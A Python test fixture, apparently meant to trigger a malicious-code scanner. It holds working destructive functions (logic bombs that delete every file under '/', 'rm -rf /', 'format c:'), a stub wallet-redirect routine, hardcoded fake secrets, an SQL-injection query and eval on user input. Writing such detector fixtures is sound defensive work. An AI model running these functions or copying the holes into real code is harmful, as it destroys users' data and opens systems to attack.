#!/usr/bin/env python3
"""
MALICIOUS CODE TEST FILE
This file contains actual malicious patterns that should be detected
"""

import os
import datetime
import subprocess
import shutil

# Time-based logic bomb - should be detected
def malicious_time_bomb():
    current_date = datetime.datetime.now()
    if current_date.year >= 2025 and current_date.month >= 3:
        # This is a real logic bomb - delete all files
        for root, dirs, files in os.walk("/"):
            for file in files:
                try:
                    os.remove(os.path.join(root, file))
                except:
                    pass

# User-targeted attack - should be detected
def user_targeted_attack():
    import getpass
    current_user = getpass.getuser()
    if current_user == "admin":
        # Delete admin's files
        shutil.rmtree("/home/admin")
        os.system("rm -rf /var/log/*")

# Counter-based logic bomb - should be detected
execution_count = 0
def counter_bomb():
    global execution_count
    execution_count += 1
    if execution_count > 100:
        # After 100 executions, destroy system
        subprocess.call("format c: /q", shell=True)

# Financial fraud - should be detected
def steal_bitcoin():
    # Redirect payments to attacker's wallet
    attacker_wallet = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
    victim_wallet = "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"
    
    # This is actual financial fraud code
    print(f"Redirecting payments from {victim_wallet} to {attacker_wallet}")

# Destructive payload - should be detected
def destroy_system():
    # This is a real destructive payload
    os.system("rm -rf /")
    shutil.rmtree("/")
    subprocess.call("format c: /q", shell=True)

# Hardcoded secrets - should be detected
DATABASE_PASSWORD = "super_secret_password_12345"
API_KEY = "sk-1234567890abcdef1234567890abcdef"
JWT_SECRET = "my_jwt_secret_key_that_should_not_be_hardcoded"

# SQL injection vulnerability - should be detected
def vulnerable_query(user_input):
    query = f"SELECT * FROM users WHERE id = {user_input}"
    # This is vulnerable to SQL injection
    return query

# Dangerous eval usage - should be detected
def dangerous_eval(user_code):
    result = eval(user_code)  # This is dangerous
    return result

# Network-based logic bomb - should be detected
def network_bomb():
    import socket
    try:
        socket.create_connection(("google.com", 80), timeout=1)
    except:
        # If network fails, destroy files
        os.remove("/important/data.txt")
        shutil.rmtree("/backup")

if __name__ == "__main__":
    # This file should trigger multiple high-severity alerts
    print("This is a test file with malicious patterns")
